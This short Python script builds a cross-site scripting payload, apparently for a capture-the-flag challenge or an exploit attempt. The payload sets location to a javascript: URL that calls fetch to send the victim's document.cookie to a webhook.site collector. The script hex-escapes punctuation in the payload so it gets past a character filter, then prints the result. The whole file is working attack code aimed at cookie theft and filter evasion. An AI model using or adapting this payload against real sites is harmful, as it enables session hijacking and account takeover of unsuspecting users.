def encode(s):
	o = ""
	for c in s:
		if c in "<>`~(),+-/*%^|&!?:;.":
			o += "\\x" + c.encode().hex()
		else:
			o += c
	return o


payload = """1[location="javascript:fetch('https://webhook.site/5812007a-90d2-4078-ad5d-7723bada7a50/'+document.cookie)"]"""
print(encode(payload))
